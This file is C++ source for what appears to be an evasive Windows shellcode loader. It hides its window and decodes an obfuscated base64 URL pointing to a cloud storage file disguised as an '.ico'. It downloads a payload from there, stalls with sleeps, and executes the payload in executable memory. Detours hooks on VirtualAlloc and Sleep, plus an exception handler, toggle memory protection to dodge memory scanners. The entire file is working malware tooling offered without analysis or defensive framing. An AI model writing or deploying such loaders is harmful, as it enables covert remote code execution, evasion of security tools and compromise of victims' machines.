//# include "pch.h"
# include <iostream>
# include<Windows.h>
# include "http.h"
# include "base64.h"
# include "detours.h"
# include "detver.h"
#pragma comment(lib,"detours.lib")
#pragma warning(disable : 4996)
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")


LPVOID bess;
SIZE_T bdlen;
DWORD bmadf;
HANDLE hEvent;


BOOL Vir_FLAG = TRUE;
LPVOID bsssscc;


static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	bdlen = dwSize;
	bess = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	return bess;
}

static VOID(WINAPI* OldSleep)(DWORD dwMilliseconds) = Sleep;
void WINAPI NewSleep(DWORD dwMilliseconds)
{
	if (Vir_FLAG)
	{
		VirtualFree(bsssscc, 0, MEM_RELEASE);
		Vir_FLAG = false;
	}
	SetEvent(hEvent);
	OldSleep(dwMilliseconds);
}



size_t GetSize(char* szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}

unsigned char* ReadBinaryFile(char* szFilePath, size_t* size)
{
	unsigned char* p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		return 0;
	}
	p = new unsigned char[*size];
	// Read file
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}

BOOL is_Exception(DWORD64 Exception_addr)
{
	if (Exception_addr < ((DWORD64)bess + bdlen) && Exception_addr >(DWORD64)bess)
	{
		return true;
	}

	return false;
}

LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo)
{

	if (pExcepInfo->ExceptionRecord->ExceptionCode == 0xc0000005 && is_Exception(pExcepInfo->ContextRecord->Rip))
	{
		VirtualProtect(bess, bdlen, PAGE_EXECUTE_READWRITE, &bmadf);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

DWORD WINAPI bsmmm(LPVOID lpParameter)
{
	while (true)
	{
		WaitForSingleObject(hEvent, INFINITE);
		VirtualProtect(bess, bdlen, PAGE_READWRITE, &bmadf);
		ResetEvent(hEvent);
	}
	return 0;
}
void aaa()
{
	DetourRestoreAfterWith();
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
	DetourAttach((PVOID*)&OldSleep, NewSleep);
	DetourTransactionCommit();
}

void bbb()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
	DetourTransactionCommit();
}

int main()
{
	size_t dataSize = 0;
	char* pData = NULL;
	hEvent = CreateEvent(NULL, TRUE, false, NULL);

	AddVectoredExceptionHandler(1, &FirstVectExcepHandler);
	aaa();
	HANDLE hThread1 = CreateThread(NULL, 0, bsmmm, NULL, 0, NULL);
	CloseHandle(hThread1);



	unsigned char* BinData = NULL;
	size_t size = 0;
	std::string a = "aHR0cDovL2VsaW5rLXN0Zy5vc3MtY24tc2hlbnpoZW4uYWxpeXVuY3MuY29tLzIwMjIvYWFhLmljbw==";
	std::string b;
	b = base64_decode2(a);
	//printf(b.c_str());

	const char* HTTP = b.c_str();
	pData = HttpReceive(HTTP, dataSize);
	
	
	/*printf(pData);
	FILE* f;
	fopen_s(&f, "logs.data", "wb");
	fwrite(pData, dataSize, 1, f);
	fclose(f);*/
	//char* szFilePath = "1.bin";
	//BinData = ReadBinaryFile(pData, &size);
	pData = (char*)ReadBase64(pData, dataSize);
	Sleep(10000);
	bsssscc = VirtualAlloc(NULL, dataSize, MEM_COMMIT, PAGE_READWRITE);
	Sleep(10000);
	memcpy(bsssscc, pData, dataSize);
	Sleep(10000);
	VirtualProtect(bsssscc, dataSize, PAGE_EXECUTE_READWRITE, &bmadf);
	(*(int(*)()) bsssscc)();

	bbb();

	return 0;
}
